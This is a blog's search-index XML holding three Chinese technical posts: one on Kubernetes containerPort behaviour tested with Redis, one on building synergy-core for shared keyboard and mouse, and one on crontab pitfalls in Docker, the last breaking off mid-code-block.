<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>k8s容器参数containerPort解析</title>
      <link href="2021/03/31/k8s%E5%AE%B9%E5%99%A8%E5%8F%82%E6%95%B0containerPort%E8%A7%A3%E6%9E%90/"/>
      <url>2021/03/31/k8s%E5%AE%B9%E5%99%A8%E5%8F%82%E6%95%B0containerPort%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x1、背景"><a href="#0x1、背景" class="headerlink" title="0x1、背景"></a>0x1、背景</h2><p>在梳理线上业务过程发现，Pod的配置文件中<code>containerPort</code>参数配置错误也能正常通信；在接触k8s时间里一直以为<code>containerPort</code>参数必须设置才能使容器内服务被外部访问，通过一系列实验发现<code>containerPort</code>这个参数有些鸡肋。</p><p>官方解释<code>containerPort</code>参数:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">List of ports to expose from the container. Exposing a port here gives the system additional </span><br><span class="line">information about the network connections a container uses, but is primarily informational.</span><br><span class="line">Not specifying a port here DOES NOT prevent that port from being exposed.</span><br><span class="line">Any port which is listening on the default &quot;0.0.0.0&quot; address inside a container will be accessible from the network. </span><br><span class="line">Cannot be updated.</span><br></pre></td></tr></table></figure><p>根据文档描述可以看出<code>containerPort</code>参数是用来暴露容器端口服务，但后面描述凡是监听<code>0.0.0.0</code>地址的端口都可以被访问即使没有设置<code>containerPort</code>参数</p><h2 id="0x2、验证"><a href="#0x2、验证" class="headerlink" title="0x2、验证"></a>0x2、验证</h2><p>为了验证文档的正确性，通过配置k8s的<code>v1.20</code>版本环境测试一下；这里采用<code>redis</code>设计实验场景</p><p>场景一</p><ul><li>配置<code>redis server</code>的监听地址为<code>0.0.0.0</code></li><li>Pod文件不使用<code>containerPort</code>参数</li></ul><p>redis-server配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">redis</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tcp</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">6379</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">component:</span> <span class="string">redis-server</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">ClusterIP</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="attr">redis.conf:</span> <span class="string">|</span></span><br><span class="line">    <span class="string">bind</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">    <span class="string">port</span> <span class="number">6379</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ConfigMap</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">redis</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">&amp;name</span> <span class="string">redis-server</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">component:</span> <span class="meta">*name</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">component:</span> <span class="meta">*name</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">command:</span> [<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;redis-server /conf/redis.conf&#x27;</span>]</span><br><span class="line">          <span class="attr">image:</span> <span class="string">redis:6.0</span></span><br><span class="line">          <span class="attr">name:</span> <span class="meta">*name</span></span><br><span class="line">          <span class="attr">volumeMounts:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/conf</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">config</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">config</span></span><br><span class="line">          <span class="attr">configMap:</span></span><br><span class="line">            <span class="attr">name:</span> <span class="string">redis</span></span><br></pre></td></tr></table></figure><p>场景二</p><ul><li>配置<code>redis server</code>的监听地址为<code>127.0.0.1</code></li><li>Pod文件使用<code>containerPort</code>参数</li></ul><p>根据实验操作结果，<code>场景一</code>是可以被访问，验证了文档中描述监听<code>0.0.0.0</code>模式下不受<code>containerPort</code>配置限制; <code>场景二</code>中是不能被访问，即使配置了<code>containerPort</code>参数。</p><p>通过上述简单实验验证，<code>containerPort</code>功能在实际业务中比较鸡肋；k8s网络组件比较复杂，后续补上相关逻辑实现部分…</p><h2 id="0x3、参考"><a href="#0x3、参考" class="headerlink" title="0x3、参考"></a>0x3、参考</h2><ul><li><a href="https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.20/#containerport-v1-core">container官方API文档</a></li><li><a href="https://medium.com/@deepeshtripathi/all-about-kubernetes-port-types-nodeport-targetport-port-containerport-e9f447330b19">kubernetes Port介绍</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> kubernetes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kubernetes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>synergy多主机共享键鼠</title>
      <link href="2021/01/17/synergy%E5%A4%9A%E4%B8%BB%E6%9C%BA%E5%85%B1%E4%BA%AB%E9%94%AE%E9%BC%A0/"/>
      <url>2021/01/17/synergy%E5%A4%9A%E4%B8%BB%E6%9C%BA%E5%85%B1%E4%BA%AB%E9%94%AE%E9%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>家里有台破旧的笔记本，为了让它继续发光发热，打算安装Debian系统配置开发环境；十年前的笔记本改装后依然可以开发诸如PHP或python之类不需要编译的项目。笔者的工作本是mbp, 两台笔记本开发时总是来回切换鼠标键盘比较麻烦，因此需要通过mbp操作旧版笔记本。</p><p>synergy是一个跨平台软件，可以通过一套键鼠操作多个不同系统主机的软件；同类型的还有微软推出的<a href="https://answers.microsoft.com/en-us/windows/forum/windows_10-start/mouse-without-borders-mousewithoutborders/0523308d-3406-4273-b86e-bef28aa6b50d?page=6"><code>无界</code></a>软件，不过该软件仅限Windows平台操作。</p><p>synergy分为收费版和开源版本，开源版本是命令行操作（无GUI），满足基本操作。</p><h2 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h2><ul><li><p>下载源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/symless/synergy-core.git</span><br><span class="line"></span><br><span class="line">cd synergy-core</span><br><span class="line"></span><br><span class="line">git checkout v2.0.0-stable</span><br></pre></td></tr></table></figure></li><li><p>配置编译(MacOS)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// 依赖qt, 如果没有安装可以brew install qt</span><br><span class="line">// 查看qt安装目录</span><br><span class="line">brew info qt </span><br><span class="line"></span><br><span class="line">// 设置Cmake环境变量</span><br><span class="line">export CMAKE_PREFIX_PATH=&quot;/usr/local/Cellar/qt/5.15.0/Frameworks/&quot;</span><br><span class="line"></span><br><span class="line">// 设置构建make文件目录</span><br><span class="line">mkdir build &amp;&amp; cd build</span><br><span class="line"></span><br><span class="line">// 注意big sur版本的sdk版本是11.0.sdk</span><br><span class="line">cmake -DCMAKE_OSX_SYSROOT=/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX11.0.sdk  -DCMAKE_OSX_DEPLOYMENT_TARGET=11.0 -DCMAKE_OSX_ARCHITECTURES=x86_64 ..</span><br><span class="line"></span><br><span class="line">// 编译</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">// make成功后生成三个二进制文件，其中synergy-core是核心文件，其他两个是旧版本程序</span><br><span class="line">synergy-core </span><br><span class="line">synergyc</span><br><span class="line">synergys</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>配置编译(Debian)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/symless/synergy-core.git</span><br><span class="line">cd synergy-core</span><br><span class="line">git checkout v2.0.0-stable</span><br><span class="line"></span><br><span class="line">mkdir build</span><br><span class="line">// Debian8版本的cmake需要升级</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br></pre></td></tr></table></figure></li><li><p>synergy配置示例</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">//</span> <span class="string">server.conf</span></span><br><span class="line"><span class="string">//</span> <span class="string">配置参考:</span> <span class="string">https://github.com/symless/synergy-core/wiki/Text-Config</span></span><br><span class="line"><span class="comment"># sample synergy configuration file</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># comments begin with the # character and continue to the end of</span></span><br><span class="line"><span class="comment"># line.  comments may appear anywhere the syntax permits.</span></span><br><span class="line"><span class="comment"># +----------+  +---------+ +---------+</span></span><br><span class="line"><span class="comment"># | mac-mini |  | macbook | | windows |</span></span><br><span class="line"><span class="comment"># |          |  |         | |         |</span></span><br><span class="line"><span class="comment"># +----------+  +---------+ +---------+</span></span><br><span class="line"></span><br><span class="line"><span class="attr">section:</span> <span class="string">screens</span></span><br><span class="line">    <span class="comment"># three hosts named:  mac-mini, macbook, and windows</span></span><br><span class="line">    <span class="comment"># These are the nice names of the hosts to make it easy to write the config file</span></span><br><span class="line">    <span class="comment"># The aliases section below contain the &quot;actual&quot; names of the hosts (their hostnames)</span></span><br><span class="line">    <span class="attr">debian:</span></span><br><span class="line">    <span class="attr">macbook:</span></span><br><span class="line">    <span class="attr">windows:</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"></span><br><span class="line"><span class="attr">section:</span> <span class="string">links</span></span><br><span class="line">    <span class="comment"># windows is to the right of macbook</span></span><br><span class="line">    <span class="comment"># mac-mini is to the left of macbook</span></span><br><span class="line">    <span class="attr">macbook:</span></span><br><span class="line">        <span class="string">right(0,100)</span> <span class="string">=</span> <span class="string">windows</span> <span class="comment"># the numbers in parentheses indicate the percentage of the screen&#x27;s edge to be considered active for switching)</span></span><br><span class="line">        <span class="string">left</span>  <span class="string">=</span> <span class="string">debian</span></span><br><span class="line">        <span class="comment"># shift = shift (shift, alt, super, meta can be mapped to any of the others)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># macbook is to the right of mac-mini</span></span><br><span class="line">    <span class="attr">debian:</span></span><br><span class="line">        <span class="string">right</span> <span class="string">=</span> <span class="string">macbook</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># macbook is to the left of windows</span></span><br><span class="line">    <span class="attr">windows:</span></span><br><span class="line">        <span class="string">left</span>  <span class="string">=</span> <span class="string">macbook</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"></span><br><span class="line"><span class="attr">section:</span> <span class="string">aliases</span></span><br><span class="line">    <span class="comment"># The &quot;real&quot; name of windows is John-Smiths-windows-3.local. </span></span><br><span class="line">    <span class="comment"># If we wanted we could remove this alias and instead use John-Smiths-windows-3.local everywhere windows is above. </span></span><br><span class="line">    <span class="comment"># Hopefully it should be easy to see why using an alias is nicer</span></span><br><span class="line">    <span class="attr">macbook:</span></span><br><span class="line">        <span class="string">mbp</span></span><br><span class="line">    <span class="attr">debian:</span></span><br><span class="line">        <span class="string">debian.local</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"></span><br><span class="line"><span class="attr">section:</span> <span class="string">options</span></span><br><span class="line">    <span class="string">switchDelay</span> <span class="string">=</span> <span class="number">400</span>   <span class="comment"># 鼠标滑到边缘时，提留多久才能切换屏幕</span></span><br><span class="line">    <span class="string">clipboardSharing</span> <span class="string">=</span> <span class="literal">true</span> <span class="comment"># 共享剪切板</span></span><br><span class="line"><span class="string">end</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>笔者采用mbp作为服务端控制Debian系统操作，需要注意的是mac环境运行软件需要设置给iterm配置权限(iterm终端执行synergy)</p><p>未配置权限报错:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">error </span>failed to create quartz event tap</span><br></pre></td></tr></table></figure><p>mac环境权限配置: 系统偏好设置 -&gt; 安全性与隐私 -&gt; 辅助功能 -&gt; iterm.app允许</p><ul><li>服务端(mbp)<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">//</span> address参数代表服务端主机IP地址</span><br><span class="line">sudo <span class="string">./synergy-core</span> <span class="params">--server</span> <span class="params">--address</span> 192.168.1.100 <span class="params">--no-daemon</span> <span class="params">--name</span> macbook <span class="params">--config</span> <span class="string">./server.conf</span></span><br></pre></td></tr></table></figure></li><li>客户端(Debian)<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="string">./synergy-core</span> <span class="params">--client</span> <span class="params">--no-daemon</span> <span class="params">--name</span> debian 192.168.1.100</span><br></pre></td></tr></table></figure></li></ul><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>操作mbp的触摸板移动到屏幕外时会进入到Debian系统屏幕中，同一局域网中操作流畅，没有卡顿现象。</p><p>如果Debian为server端操作mbp时会导致鼠标移动到mbp屏幕时点击无效情况。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1、[Synergy-core编译使用教程] <a href="https://segmentfault.com/a/1190000023512582">https://segmentfault.com/a/1190000023512582</a></p><p>2、[synergy文档] <a href="https://github.com/symless/synergy-core/wiki/Compiling">https://github.com/symless/synergy-core/wiki/Compiling</a></p><p>3、[cmake官网] <a href="https://cmake.org/download/">https://cmake.org/download/</a></p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> synergy </tag>
            
            <tag> 共享键鼠 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker环境之Crontab踩坑</title>
      <link href="2020/03/25/Docker%E7%8E%AF%E5%A2%83%E4%B9%8BCrontab%E8%B8%A9%E5%9D%91/"/>
      <url>2020/03/25/Docker%E7%8E%AF%E5%A2%83%E4%B9%8BCrontab%E8%B8%A9%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h2 id="0x1-背景"><a href="#0x1-背景" class="headerlink" title="0x1.背景"></a>0x1.背景</h2><p>业务中遇到Python镜像使用crontab执行任务不执行的情况，通过一系列定位分析后发现crontab在处理环境变量和crontab任务文件解析存在问题。</p><p>环境</p><ul><li>镜像: Python:3.7.5</li><li>Crontab版本: 3.0pl1-127+deb8u2</li></ul><p>crontab任务文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /usr/local/bin/python job.py &gt;&gt; /tmp/job.log 2&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="0x2-环境变量"><a href="#0x2-环境变量" class="headerlink" title="0x2.环境变量"></a>0x2.环境变量</h2><p>python程序执行时采用<code>os.environ</code>读取环境变量，在调试程序时发现docker镜像打包运行后，程序报错无法读取环境变量值。登陆到k8s环境中手动执行env命令发现是可以获取注入的环境变量，修改python文件打印env环境信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">environ(&#123;&#x27;HOME&#x27;: &#x27;/root&#x27;, &#x27;LOGNAME&#x27;: &#x27;root&#x27;, &#x27;PATH&#x27;: &#x27;/usr/bin:/bin&#x27;, &#x27;SHELL&#x27;: &#x27;/bin/sh&#x27;, &#x27;PWD&#x27;: &#x27;/root&#x27;, &#x27;LC_CTYPE&#x27;: &#x27;C.UTF-8&#x27;&#125;)</span><br></pre></td></tr></table></figure><p>上述环境是基础的环境变量信息，python程序无法在执行环境获取新增的环境变量。在查找资料过程中发现crontab守护进程会从<code>/etc/environment</code>和<code>/etc/default/locale</code>获取环境变量。在Debian环境中采用service的方式运行<code>/usr/sbin/cron</code>, 定位对应的执行脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">cat /etc/init.d/cron</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">parse_environment ()</span><br><span class="line">&#123;</span><br><span class="line">    for ENV_FILE in /etc/environment /etc/default/locale; do</span><br><span class="line">        [ -r &quot;$ENV_FILE&quot; ] || continue</span><br><span class="line">        [ -s &quot;$ENV_FILE&quot; ] || continue</span><br><span class="line"></span><br><span class="line">         for var in LANG LANGUAGE LC_ALL LC_CTYPE; do</span><br><span class="line">             value=`egrep &quot;^$&#123;var&#125;=&quot; &quot;$ENV_FILE&quot; | tail -n1 | cut -d= -f2`</span><br><span class="line">             [ -n &quot;$value&quot; ] &amp;&amp; eval export $var=$value</span><br><span class="line"></span><br><span class="line">             if [ -n &quot;$value&quot; ] &amp;&amp; [ &quot;$ENV_FILE&quot; = /etc/environment ]; then</span><br><span class="line">                 log_warning_msg &quot;/etc/environment has been deprecated for locale information; use /etc/default/locale for $var=$value instead&quot;</span><br><span class="line">             fi</span><br><span class="line">         done</span><br><span class="line">     done</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Get the timezone <span class="built_in">set</span>.</span></span><br><span class="line">    if [ -z &quot;$TZ&quot; -a -e /etc/timezone ]; then</span><br><span class="line">        TZ=`cat /etc/timezone`</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Parse the system<span class="string">&#x27;s environment</span></span></span><br><span class="line">if [ &quot;$READ_ENV&quot; = &quot;yes&quot; ] ; then</span><br><span class="line">    parse_environment</span><br><span class="line">fi</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>shell脚本采用加载environment和locale文件将环境变量注入到当前进程环境中，根据crontab在<code>bug#543895</code>描述推荐使用locale文件。</p><p>经过上述分析，需要调整Dockerfile相关文件操作；这里采用entrypoint.sh文件注入环境变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env &gt;&gt; /etc/default/locale</span><br></pre></td></tr></table></figure><h2 id="0x3-任务解析与权限"><a href="#0x3-任务解析与权限" class="headerlink" title="0x3.任务解析与权限"></a>0x3.任务解析与权限</h2><p>crontab任务创建有两种方式，一种是直接使用crontab命令手动编辑写入，另一种是将写好的任务文件复制到<code>/var/spool/cron/crontabs</code>目录中。</p><p>排查某个业务问题时，发现crontab任务不能执行（采用文件复制形式）；进入POD容器中使用cat命令查看任务文件也是显示正常，但是任务还是不能执行。后来通过crontab查看保存后，任务能正常执行。</p><p>回溯两次操作时，发现两个有意思的问题。问题一是crontab命令编辑任务文件保存后，该任务文件的组权限变成<code>root:crontab</code>(原root:root);问题二是crontab命令编辑查看文件后直接保存，文件大小发生改变，此过程无人为更改内容。</p><p>问题一的出现是因为crontab命令编辑文件时会设置任务文件的组，Debian镜像环境中只有root用户，用户组列表中是存在crontab组。由于Docker环境中只有root用户执行，不需要调整任务文件的权限；但非Docker环境中，crontab的任务文件一般设置600权限居多；cron守护进程读取文件时会校验权限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#https:<span class="comment">//github.com/ushell/learncode/blob/master/crontab/debian/cron-3.0pl1/database.c#L206</span></span></span><br><span class="line">...</span><br><span class="line"><span class="comment">/*任务文件权限校验*/</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(fname, <span class="string">&quot;*system*&quot;</span>) &amp;&amp; !(pw = getpwnam(uname))) &#123;</span><br><span class="line"><span class="comment">/* file doesn&#x27;t have a user in passwd file.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">log_it(fname, getpid(), <span class="string">&quot;ORPHAN&quot;</span>, <span class="string">&quot;no passwd entry&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> next_crontab;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((crontab_fd = open(tabname, O_RDONLY, <span class="number">0</span>)) &lt; OK) &#123;</span><br><span class="line"><span class="comment">/* crontab not accessible?</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">log_it(fname, getpid(), <span class="string">&quot;CAN&#x27;T OPEN&quot;</span>, tabname);</span><br><span class="line"><span class="keyword">goto</span> next_crontab;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fstat(crontab_fd, statbuf) &lt; OK) &#123;</span><br><span class="line">log_it(fname, getpid(), <span class="string">&quot;FSTAT FAILED&quot;</span>, tabname);</span><br><span class="line"><span class="keyword">goto</span> next_crontab;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*查询/etc/passwd文件中用户*/</span></span><br><span class="line">u = find_user(old_db, fname);</span><br><span class="line"><span class="keyword">if</span> (u != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">/* if crontab has not changed since we last read it</span></span><br><span class="line"><span class="comment"> * in, then we can just use our existing entry.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (u-&gt;mtime == statbuf-&gt;st_mtime) &#123;</span><br><span class="line">Debug(DLOAD, (<span class="string">&quot; [no change, using old data]&quot;</span>))</span><br><span class="line">unlink_user(old_db, u);</span><br><span class="line">link_user(new_db, u);</span><br><span class="line"><span class="keyword">goto</span> next_crontab;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* before we fall through to the code that will reload</span></span><br><span class="line"><span class="comment"> * the user, let&#x27;s deallocate and unlink the user in</span></span><br><span class="line"><span class="comment"> * the old database.  This is more a point of memory</span></span><br><span class="line"><span class="comment"> * efficiency than anything else, since all leftover</span></span><br><span class="line"><span class="comment"> * users will be deleted from the old database when</span></span><br><span class="line"><span class="comment"> * we finish with the crontab...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Debug(DLOAD, (<span class="string">&quot; [delete old data]&quot;</span>))</span><br><span class="line">unlink_user(old_db, u);</span><br><span class="line">free_user(u);</span><br><span class="line">log_it(fname, getpid(), <span class="string">&quot;RELOAD&quot;</span>, tabname);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>问题二的出现比较诡异，文件大小变化但cat查看文件内容没有明显变化。通过xxd命令查看文件改动前后的十六进制信息</p><ul><li><p>crontab改动前</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00000000: 3020 3020 2a20 2a20 2a20 2f75 7372 2f6c  0 0 * * * /usr/l</span><br><span class="line">00000010: 6f63 616c 2f62 696e 2f70 7974 686f 6e20  ocal/bin/python</span><br><span class="line">//省略...</span><br><span class="line">000000f0: 2e6c 6f67 2032 3e26 31                   .log 2&gt;&amp;1</span><br></pre></td></tr></table></figure></li><li><p>crontab改动后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00000000: 3020 3020 2a20 2a20 2a20 2f75 7372 2f6c  0 0 * * * /usr/l</span><br><span class="line">00000010: 6f63 616c 2f62 696e 2f70 7974 686f 6e20  ocal/bin/python</span><br><span class="line">//省略...</span><br><span class="line">000000f0: 2e6c 6f67 2032 3e26 310a                 .log 2&gt;&amp;1.</span><br></pre></td></tr></table></figure><p>注意到文件结尾处的区别，改动后多了<code>0x0a</code>标志信息即文件换行符<code>LF</code>。由于任务文件最后一行没有换行符号导致不能加载该条命令。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 